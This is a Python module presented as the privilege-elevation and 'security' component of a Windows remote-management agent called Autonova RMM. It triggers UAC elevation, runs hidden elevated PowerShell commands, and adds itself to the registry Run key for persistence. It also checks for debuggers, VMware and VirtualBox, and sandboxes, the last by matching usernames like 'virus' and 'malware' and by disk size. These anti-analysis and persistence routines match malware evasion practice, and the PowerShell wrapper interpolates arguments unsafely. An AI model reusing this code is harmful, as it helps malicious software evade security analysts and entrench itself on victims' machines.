"""
Autonova RMM - UAC Elevation and Security Module
Handles privilege elevation, obfuscation, and anti-debugging.
"""

import ctypes
import os
import sys
import subprocess
from typing import Tuple, Optional
import winreg


def is_admin() -> bool:
    """
    Check if the current process has administrator privileges.
    
    Returns:
        True if running as admin
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def elevate_privileges() -> bool:
    """
    Request UAC elevation if not already running as admin.
    Restarts the process with elevated privileges.
    
    Returns:
        True if already admin, False if elevation was requested (process will restart)
    """
    if is_admin():
        return True
    
    # Get the executable path
    if getattr(sys, 'frozen', False):
        # Running as compiled .exe
        executable = sys.executable
        params = ' '.join(sys.argv[1:])
    else:
        # Running as Python script
        executable = sys.executable
        params = ' '.join([sys.argv[0]] + sys.argv[1:])
    
    try:
        # ShellExecuteW with 'runas' verb triggers UAC prompt
        result = ctypes.windll.shell32.ShellExecuteW(
            None,           # hwnd
            "runas",        # Operation (run as admin)
            executable,     # File
            params,         # Parameters
            None,           # Directory
            1               # Show command (SW_SHOWNORMAL)
        )
        
        # Result > 32 means success
        if result > 32:
            sys.exit(0)  # Exit current non-elevated process
        else:
            return False
            
    except Exception:
        return False


def run_elevated_command(command: list) -> Tuple[int, str, str]:
    """
    Run a command with elevated privileges using PowerShell.
    
    Args:
        command: Command and arguments as list
        
    Returns:
        Tuple of (return_code, stdout, stderr)
    """
    # Build PowerShell command
    ps_command = (
        f"Start-Process -FilePath '{command[0]}' "
        f"-ArgumentList '{' '.join(command[1:])}' "
        f"-Verb RunAs -Wait -PassThru"
    )
    
    try:
        process = subprocess.Popen(
            ['powershell', '-Command', ps_command],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        stdout, stderr = process.communicate()
        return (
            process.returncode,
            stdout.decode('utf-8', errors='ignore'),
            stderr.decode('utf-8', errors='ignore')
        )
    except Exception as e:
        return (-1, '', str(e))


class AntiDebug:
    """Anti-debugging techniques for agent protection."""
    
    @staticmethod
    def check_debugger() -> bool:
        """
        Check if a debugger is attached to the process.
        
        Returns:
            True if debugger detected
        """
        try:
            return ctypes.windll.kernel32.IsDebuggerPresent() != 0
        except Exception:
            return False
    
    @staticmethod
    def check_remote_debugger() -> bool:
        """
        Check for remote debugger attachment.
        
        Returns:
            True if remote debugger detected
        """
        try:
            is_debugged = ctypes.c_bool()
            ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
                ctypes.windll.kernel32.GetCurrentProcess(),
                ctypes.byref(is_debugged)
            )
            return is_debugged.value
        except Exception:
            return False
    
    @staticmethod
    def check_vm_artifacts() -> bool:
        """
        Check for common virtual machine artifacts.
        
        Returns:
            True if VM environment suspected
        """
        vm_indicators = [
            # Registry keys
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions"),
        ]
        
        for hkey, subkey in vm_indicators:
            try:
                key = winreg.OpenKey(hkey, subkey)
                winreg.CloseKey(key)
                return True
            except WindowsError:
                continue
        
        # Check for VM-related processes
        vm_processes = ['vmtoolsd.exe', 'vmwaretray.exe', 'vboxservice.exe', 'vboxtray.exe']
        try:
            import psutil
            running = [p.name().lower() for p in psutil.process_iter(['name'])]
            if any(vm_proc in running for vm_proc in vm_processes):
                return True
        except Exception:
            pass
        
        return False
    
    @staticmethod
    def is_sandboxed() -> bool:
        """
        Check if running in a sandbox environment.
        
        Returns:
            True if sandbox suspected
        """
        # Check for common sandbox usernames
        sandbox_users = ['sandbox', 'virus', 'malware', 'test', 'sample']
        username = os.environ.get('USERNAME', '').lower()
        
        if any(su in username for su in sandbox_users):
            return True
        
        # Check for limited disk space (common in sandboxes)
        try:
            import psutil
            total_space = sum(
                psutil.disk_usage(p.mountpoint).total 
                for p in psutil.disk_partitions(all=False)
            )
            # Less than 60GB total is suspicious
            if total_space < 60 * 1024 * 1024 * 1024:
                return True
        except Exception:
            pass
        
        return False


class RegistryManager:
    """Manage registry entries for persistence."""
    
    RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
    AGENT_NAME = "AutonovaAgent"
    
    @classmethod
    def add_autostart(cls, executable_path: str) -> bool:
        """
        Add agent to Windows startup.
        
        Args:
            executable_path: Full path to agent executable
            
        Returns:
            True if successful
        """
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                cls.RUN_KEY,
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, cls.AGENT_NAME, 0, winreg.REG_SZ, executable_path)
            winreg.CloseKey(key)
            return True
        except Exception:
            return False
    
    @classmethod
    def remove_autostart(cls) -> bool:
        """
        Remove agent from Windows startup.
        
        Returns:
            True if successful or already removed
        """
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                cls.RUN_KEY,
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.DeleteValue(key, cls.AGENT_NAME)
            winreg.CloseKey(key)
            return True
        except FileNotFoundError:
            return True  # Already removed
        except Exception:
            return False
    
    @classmethod
    def is_in_autostart(cls) -> bool:
        """
        Check if agent is in startup.
        
        Returns:
            True if agent is set to autostart
        """
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, cls.RUN_KEY, 0, winreg.KEY_READ)
            winreg.QueryValueEx(key, cls.AGENT_NAME)
            winreg.CloseKey(key)
            return True
        except Exception:
            return False


def get_security_status() -> dict:
    """
    Get comprehensive security status.
    
    Returns:
        Dictionary with security information
    """
    anti_debug = AntiDebug()
    
    return {
        "is_admin": is_admin(),
        "debugger_attached": anti_debug.check_debugger(),
        "remote_debugger": anti_debug.check_remote_debugger(),
        "vm_detected": anti_debug.check_vm_artifacts(),
        "sandbox_detected": anti_debug.is_sandboxed(),
        "in_autostart": RegistryManager.is_in_autostart()
    }
